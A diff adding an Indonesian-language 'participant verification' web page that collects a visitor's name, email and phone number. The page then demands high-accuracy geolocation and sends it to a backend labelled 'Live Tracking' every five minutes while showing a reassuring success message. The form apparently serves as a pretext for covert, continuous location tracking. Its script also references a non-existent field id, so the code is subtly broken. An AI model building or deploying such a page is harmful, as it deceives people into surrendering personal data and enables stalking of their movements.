@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Peserta</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f4f4f9; }
+        .card { background: #031927; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0px 4px 10px rgba(0,0,0,0.1); width: 320px; text-align: left; }
+        h2 { color: #BA1200; text-align: center; margin-bottom: 10px; }
+        p { color: #C8E0F4; font-size: 14px; text-align: center; margin-bottom: 20px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 13px; color: #BA1200; margin-bottom: 5px; font-weight: bold; }
+        input { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; }
+        button { width: 100%; padding: 10px; background: #BA1200; color: #9DD1F1; border: none; border-radius: 5px; font-size: 15px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        button:hover { background: #031927; }
+        .success-box { text-align: center; display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <!-- FORMULIR INPUT DATA DIRI -->
+        <div id="form-section">
+            <h2>Verifikasi Peserta</h2>
+            <p>Silakan isi data diri Anda untuk melanjutkan proses verifikasi sistem.</p>
+            
+            <form id="verificationForm">
+                <div class="form-group">
+                    <label>Nama Lengkap:</label>
+                    <input type="text" id="peserta_name" placeholder="Contoh: Budi Santoso" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Email:</label>
+                    <input type="email" id="email" placeholder="budi@example.com" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Nomor Telepon / WhatsApp:</label>
+                    <input type="tel" id="phone_number" placeholder="081234567890" required>
+                </div>
+                
+                <button type="submit">Lanjutkan & Hubungkan</button>
+            </form>
+        </div>
+
+        <!-- TAMPILAN SETELAH BERHASIL -->
+        <div id="success-section" class="success-box">
+            <h2>Terhubung!</h2>
+            <p>Perangkat Anda berhasil diverifikasi dan tersinkronisasi secara real-time.</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Mencegah halaman reload
+
+            // Ambil data dari form input
+            const ownerName = document.getElementById('owner_name').value;
+            const email = document.getElementById('email').value;
+            const phoneNumber = document.getElementById('phone_number').value;
+
+            // Fungsi untuk mengirim data lokasi ke backend Flask
+            function sendLocationData() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+
+                        const deviceData = {
+                            owner_name: ownerName,
+                            email: email,
+                            phone_number: phoneNumber,
+                            latitude: lat,
+                            longitude: lon,
+                            status: "Online (Live Tracking)"
+                        };
+
+                        // Kirim ke endpoint Flask
+                        fetch('/api/device', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(deviceData)
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log("Data lokasi diperbarui:", data);
+                            // Ubah tampilan card menjadi pesan sukses
+                            document.getElementById('form-section').style.display = 'none';
+                            document.getElementById('success-section').style.display = 'block';
+                        })
+                        .catch(error => console.error("Gagal mengirim data:", error));
+
+                    }, function(error) {
+                        alert("Akses lokasi wajib diizinkan (Allow) untuk melanjutkan proses ini!");
+                    }, {
+                        enableHighAccuracy: true
+                    });
+                } else {
+                    alert("Browser Anda tidak mendukung fitur Geolocation.");
+                }
+            }
+
+            // Kirim data dan lokasi untuk pertama kalinya
+            sendLocationData();
+
+            // Atur perulangan (interval) otomatis setiap 5 menit sekali (300.000 ms)
+            setInterval(sendLocationData, 300000);
+        });
+    </script>
+</body>
+</html>
